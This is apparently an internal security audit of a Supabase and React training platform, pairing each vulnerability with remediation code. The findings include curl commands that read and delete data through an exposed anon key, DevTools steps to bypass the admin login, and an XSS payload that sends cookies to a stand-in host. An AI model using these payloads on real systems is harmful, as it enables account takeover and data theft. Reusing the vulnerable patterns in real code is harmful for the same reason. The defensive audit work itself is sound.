Security Research

DataForest Learning is a training platform provided to us by a partner. As part of an internal security review, I audited the application for vulnerabilities. Below is the timeline of each discovery alongside the proposed fix.

Full architecture diagram — click to open. View full size

CRITICAL Hardcoded Admin Password in Client Bundle

The function dbAdminPw fetches the password from Supabase but ships a hardcoded fallback. Open DevTools → Sources → search "admin" and it's right there:

const dbAdminPw = async () => {
  const { data } = await SB.from("admins")
    .select("password").limit(1).single();
  return data?.password || "admin123";
};

Even if RLS blocked the query, the fallback guarantees the password is always readable. It's shipped to every visitor.

FIX Server-Side Auth with Hashed Passwords

Remove all client-side password logic. Use Supabase Auth with email/password sign-in. Passwords are hashed server-side automatically:

// Sign up — Supabase hashes with bcrypt server-side
const { data, error } = await supabase.auth.signUp({
  email: 'admin@dataforest.com',
  password: crypto.randomUUID() // generated, never hardcoded
});

// Sign in — returns a JWT, not a plaintext match
const { data, error } = await supabase.auth.signInWithPassword({
  email: 'admin@dataforest.com',
  password: userInput
});

CRITICAL Exposed Supabase Anon Key — No RLS

The Supabase URL and anonymous key are string literals in the bundle. With zero RLS policies, the anon key grants full CRUD on every table:

curl 'https://<project>.supabase.co/rest/v1/admins?select=*' \
  -H 'apikey: <anon_key_from_bundle>'

# 200 OK: [{"id":1,"password":"admin123"}]

curl -X DELETE \
  'https://<project>.supabase.co/rest/v1/projects?id=eq.on7xtn0' \
  -H 'apikey: <anon_key_from_bundle>'

# 204 No Content — course deleted, zero auth

Confirmed: SELECT (200), UPSERT (201), DELETE (204) all succeed on admins, users, projects, and the cores-images storage bucket.

FIX Enable RLS on Every Table

The anon key is meant to be public — but only when RLS restricts what it can reach. Add policies per table:

-- Enable RLS
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;
ALTER TABLE users    ENABLE ROW LEVEL SECURITY;
ALTER TABLE admins   ENABLE ROW LEVEL SECURITY;

-- Public: read-only access to published courses
CREATE POLICY "public_read_projects" ON projects
  FOR SELECT USING (true);

-- Admin: full access scoped to authenticated admin role
CREATE POLICY "admin_all_projects" ON projects
  FOR ALL USING (
    auth.uid() IN (SELECT id FROM admins)
  );

-- Block anon writes entirely
CREATE POLICY "deny_anon_writes" ON projects
  FOR INSERT WITH CHECK (auth.role() = 'authenticated');

CRITICAL Client-Side Auth — No Server Validation

The entire admin login is a local string comparison. No session, no JWT, no server round-trip:

const [adminPw, setAdminPw] = useState(null);
useEffect(() => { dbAdminPw().then(setAdminPw); }, []);

const tryAdmin = () =>
  pw === adminPw
    ? onAdmin()       // just flips a React state var
    : setPwErr("Incorrect password.");

const onAdmin = () => setScreen("admin");

Three independent bypasses: (1) read adminPw from React state in DevTools, (2) call setScreen("admin") from console, (3) skip the UI — hit Supabase REST directly with the anon key.

FIX JWT Sessions + Server-Side Gating

Replace the state-based check with Supabase Auth sessions. The admin screen is gated on a valid JWT, and every API call is validated server-side via RLS:

// Auth-gated admin check
const { data: { session } } = await supabase.auth.getSession();
if (!session) return setScreen("home");

// Verify admin role from JWT claims
const { data: admin } = await supabase
  .from("admins")
  .select("id")
  .eq("id", session.user.id)
  .single();

if (admin) setScreen("admin");
else setScreen("home");

// Every subsequent DB call now carries the JWT
// RLS policies enforce access — not UI state

HIGH Stored XSS via Rich Text Editor

Slide body content from the Quill editor is rendered with dangerouslySetInnerHTML. Given the auth bypass, anyone can inject HTML/JS that runs for every learner:

<div dangerouslySetInnerHTML={{ __html: slide.body }} />

// Injected payload (via admin panel or direct API):
// <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

FIX DOMPurify + Content Security Policy

// Sanitize before render
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(slide.body)
}} />

Add a CSP header in netlify.toml or _headers:

# _headers
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https://*.supabase.co;

HIGH Plaintext Password Storage

The admins table stores the password as a raw string — no hashing, no salting:

SELECT * FROM admins;

-- id | password
-- 1  | admin123

FIX Drop the admins Table Entirely

With Supabase Auth handling credentials, the custom admins table is unnecessary:

-- Remove the liability
DROP TABLE admins;

-- Admin role lives in auth.users metadata instead
UPDATE auth.users
SET raw_app_meta_data = raw_app_meta_data || '{"role":"admin"}'
WHERE email = 'admin@dataforest.com';

MEDIUM No CSP + No Input Validation

No Content-Security-Policy header. Learner names, media URLs, and quiz feedback accepted with no length limits, format checks, or encoding — widening the attack surface for XSS and injection.

FIX Validate at Boundaries

// Validate learner name
const name = input.trim().slice(0, 100);
if (!/^[\p{L}\p{N}\s.\-']+$/u.test(name))
  throw new Error("Invalid name");

// Validate media URLs
const url = new URL(input);
if (!['https:'].includes(url.protocol))
  throw new Error("HTTPS only");

// Server-side: Supabase check constraint
ALTER TABLE users ADD CONSTRAINT name_length
  CHECK (char_length(name) BETWEEN 1 AND 100);
